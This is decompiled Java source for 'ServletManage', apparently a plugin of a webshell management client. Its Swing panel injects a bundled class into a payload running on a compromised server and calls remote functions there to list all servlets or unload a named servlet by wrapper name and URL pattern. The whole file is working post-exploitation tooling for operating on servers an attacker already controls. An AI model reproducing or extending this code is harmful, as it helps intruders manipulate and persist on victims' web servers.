/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.GBC;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.Frame;
import java.awt.GridBagLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName="JavaDynamicPayload", Name="ServletManage", DisplayName="ServletManage")
public class ServletManage
implements Plugin {
    private static final String CLASS_NAME = "plugin.ServletManage";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JButton getAllServletButton = new JButton("GetAllServlet");
    private final JButton unLoadServletButton = new JButton("UnLoadServlet");
    private final JSplitPane splitPane;
    private final RTextArea resultTextArea = new RTextArea();
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public ServletManage() {
        this.splitPane = new JSplitPane();
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.getAllServletButton);
        topPanel.add(this.unLoadServletButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter(){

            @Override
            public void componentResized(ComponentEvent e) {
                ServletManage.this.splitPane.setDividerLocation(0.15);
            }
        });
        this.panel.add(this.splitPane);
    }

    private void getAllServletButtonClick(ActionEvent actionEvent) {
        this.resultTextArea.setText(this.getAllServlet());
    }

    private void unLoadServletButtonClick(ActionEvent actionEvent) {
        UnServlet unServlet = new UnLoadServletDialog(this.shellEntity.getFrame(), "UnLoadServlet", "", "").getResult();
        if (unServlet.state) {
            String resultString = this.unLoadServlet(unServlet.wrapperName, unServlet.urlPattern);
            Log.log(resultString, new Object[0]);
            GOptionPane.showMessageDialog(this.panel, resultString, "\u63d0\u793a", 1);
        } else {
            Log.log("\u7528\u6237\u53d6\u6d88\u9009\u62e9.....", new Object[0]);
        }
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/ServletManage.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success", new Object[0]);
                } else {
                    Log.log("Load fail", new Object[0]);
                }
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    private String getAllServlet() {
        this.load();
        byte[] resultByteArray = this.payload.evalFunc(CLASS_NAME, "getAllServlet", new ReqParameter());
        return this.encoding.Decoding(resultByteArray);
    }

    private String unLoadServlet(String wrapperName, String urlPattern) {
        this.load();
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("wrapperName", wrapperName);
        reqParameter.add("urlPattern", urlPattern);
        byte[] resultByteArray = this.payload.evalFunc(CLASS_NAME, "unLoadServlet", reqParameter);
        return this.encoding.Decoding(resultByteArray);
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }

    class UnLoadServletDialog
    extends JDialog {
        private final JTextField wrapperNameTextField;
        private final JTextField urlPatternTextField;
        private final JLabel wrapperNameLabel;
        private final JLabel urlPatternLabel;
        private final JButton okButton;
        private final JButton cancelButton;
        private final UnServlet unServlet;
        private final Dimension TextFieldDim;

        private UnLoadServletDialog(Frame frame, String tipString, String wrapperNameString, String urlPatternString) {
            super(frame, tipString, true);
            this.TextFieldDim = new Dimension(500, 23);
            this.unServlet = new UnServlet();
            this.wrapperNameTextField = new JTextField("wrapperNameText", 30);
            this.urlPatternTextField = new JTextField("destText", 30);
            this.wrapperNameLabel = new JLabel("wrapperName");
            this.urlPatternLabel = new JLabel("urlPattern");
            this.okButton = new JButton("unLoad");
            this.cancelButton = new JButton("cancel");
            Dimension TextFieldDim = new Dimension(200, 23);
            GBC gbcLSrcFile = new GBC(0, 0).setInsets(5, -40, 0, 0);
            GBC gbcSrcFile = new GBC(1, 0, 3, 1).setInsets(5, 20, 0, 0);
            GBC gbcLDestFile = new GBC(0, 1).setInsets(5, -40, 0, 0);
            GBC gbcDestFile = new GBC(1, 1, 3, 1).setInsets(5, 20, 0, 0);
            GBC gbcOkButton = new GBC(0, 2, 2, 1).setInsets(5, 20, 0, 0);
            GBC gbcCancelButton = new GBC(2, 2, 1, 1).setInsets(5, 20, 0, 0);
            this.wrapperNameTextField.setPreferredSize(TextFieldDim);
            this.urlPatternTextField.setPreferredSize(TextFieldDim);
            this.setLayout(new GridBagLayout());
            this.add((Component)this.wrapperNameLabel, gbcLSrcFile);
            this.add((Component)this.wrapperNameTextField, gbcSrcFile);
            this.add((Component)this.urlPatternLabel, gbcLDestFile);
            this.add((Component)this.urlPatternTextField, gbcDestFile);
            this.add((Component)this.okButton, gbcOkButton);
            this.add((Component)this.cancelButton, gbcCancelButton);
            automaticBindClick.bindJButtonClick(this, this);
            this.addWindowListener(new WindowListener(){

                @Override
                public void windowOpened(WindowEvent paramWindowEvent) {
                }

                @Override
                public void windowIconified(WindowEvent paramWindowEvent) {
                }

                @Override
                public void windowDeiconified(WindowEvent paramWindowEvent) {
                }

                @Override
                public void windowDeactivated(WindowEvent paramWindowEvent) {
                }

                @Override
                public void windowClosing(WindowEvent paramWindowEvent) {
                    UnLoadServletDialog.this.cancelButtonClick(null);
                }

                @Override
                public void windowClosed(WindowEvent paramWindowEvent) {
                }

                @Override
                public void windowActivated(WindowEvent paramWindowEvent) {
                }
            });
            this.wrapperNameTextField.setText(wrapperNameString);
            this.urlPatternTextField.setText(urlPatternString);
            functions.setWindowSize(this, 650, 180);
            this.setLocationRelativeTo(frame);
            this.setDefaultCloseOperation(2);
            this.setVisible(true);
        }

        public UnServlet getResult() {
            return this.unServlet;
        }

        private void okButtonClick(ActionEvent actionEvent) {
            this.unServlet.state = true;
            this.changeFileInfo();
        }

        private void cancelButtonClick(ActionEvent actionEvent) {
            this.unServlet.state = false;
            this.changeFileInfo();
        }

        private void changeFileInfo() {
            this.unServlet.urlPattern = this.urlPatternTextField.getText();
            this.unServlet.wrapperName = this.wrapperNameTextField.getText();
            this.dispose();
        }
    }

    class UnServlet {
        public boolean state;
        public String wrapperName;
        public String urlPattern;

        UnServlet() {
        }
    }
}

